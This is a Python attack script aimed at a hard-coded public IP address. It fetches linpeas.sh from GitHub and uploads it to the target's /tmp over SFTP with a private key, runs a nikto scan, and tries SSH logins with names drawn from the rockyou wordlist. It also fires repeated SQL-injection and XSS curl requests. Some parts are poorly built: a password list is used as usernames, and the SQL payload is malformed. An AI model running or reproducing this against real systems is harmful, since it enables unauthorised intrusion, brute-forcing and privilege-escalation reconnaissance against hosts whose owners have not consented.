import paramiko
import subprocess
import sys
import signal
from contextlib import contextmanager

TARGET = "51.145.251.231"
USER = "ubuntu"
KEY = "/home/kali/Desktop/Dectar April/dev.pm"
LINPEAS = "https://github.com/carlospolop/PEASS-ng/releases/download/20220731/linpeas.sh"
NIKTO = "http://"+TARGET
HYDRA = TARGET
LOGIN = "admin"
LIST = "/usr/share/wordlists/rockyou.txt"

class Timeout(Exception):
    pass

@contextmanager
def limit(s):
    def handler(signum, frame):
        raise Timeout("Timed out!")
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(s)
    try:
        yield
    finally:
        signal.alarm(0)

def dl_and_trans():
    try:
        with limit(120):
            subprocess.run(["wget", LINPEAS, "-O", "linpeas.sh"], timeout=120)
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            pkey = paramiko.RSAKey.from_private_key_file(KEY)
            ssh.connect(TARGET, username=USER, pkey=pkey)
            
            sftp = ssh.open_sftp()
            sftp.put('linpeas.sh', '/tmp/linpeas.sh')
            sftp.close()
            ssh.close()
            print("Transferred.")
    except Timeout:
        print("Timed out")

def nikto():
    try:
        with limit(120):
            subprocess.run(["nikto", "-h", NIKTO], timeout=120)
    except Timeout:
        print("Timed out")

def ssh_brute(ip, kf, ul_path):
    k = paramiko.RSAKey.from_private_key_file(kf)
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(ul_path, 'r') as f:
        ul = [line.strip() for line in f.readlines()]
    for u in ul:
        try:
            c.connect(hostname=ip, username=u, pkey=k, look_for_keys=False)
            c.close()
        except paramiko.AuthenticationException:
            print(f"Failed for {u}")
        except Exception as e:
            print(f"Error: {e}")

def hydra():
    try:
        with limit(120):
            ssh_brute(TARGET,KEY,LIST)
    except Timeout:
        print("Timed out")

def sqli():
    try:
        for i in range(100):
            subprocess.run(["curl","http://"+TARGET+"/users/?id=SELECT+*+FROM+users%22;"], timeout=120)
    except Timeout:
        print("Timed out")

def xss():
    try:
        for i in range(50):
            with limit(120):
                subprocess.run(["curl", 'http://'+TARGET+'/about-us.php?xss=<script>alert(1)<%2Fscript>'], timeout=120)
    except Timeout:
        print("Timed out")


if __name__ == "__main__":
    dl_and_trans()
    nikto()
    hydra()
    sqli()
    xss()
